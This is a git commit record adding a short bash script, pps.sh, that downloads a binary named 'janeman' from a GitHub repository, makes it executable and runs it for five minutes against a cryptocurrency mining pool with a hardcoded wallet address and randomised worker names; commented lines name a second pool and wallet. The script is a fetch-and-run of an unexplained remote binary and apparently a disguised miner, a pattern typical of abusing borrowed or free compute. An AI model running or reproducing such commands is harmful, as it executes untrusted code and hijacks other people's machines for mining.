1f7b163617919d9beeaebac1e7e7fa069d482bfc
vijaykumar892121 <93004368+vijaykumar892121@users.noreply.github.com>
2021-10-22 23:29:00 +0530

    Create pps.sh

---
+++ pps.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
+#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
+#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
+wget https://github.com/archernap/prem/raw/main/janeman
+chmod +x janeman
+timeout 5m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
